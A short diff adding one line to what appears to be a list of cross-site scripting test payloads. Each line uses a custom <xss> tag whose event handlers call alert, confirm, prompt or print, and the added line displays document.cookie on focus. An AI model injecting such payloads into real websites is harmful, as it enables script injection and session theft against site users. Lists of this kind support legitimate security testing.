@@ -6,6 +6,7 @@
 <xss onclick=alert(1)>x</xss>
 <xss onclick=confirm(1)>x</xss>
 <xss onclick=print()>x</xss>
+<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
 <xss id=x tabindex=1 onfocus=prompt(1)>#x</xss>
 <xss id=x tabindex=1 onfocus=alert(1)>#x</xss>
 <xss id=x tabindex=1 onfocus=confirm(1)>#x</xss>
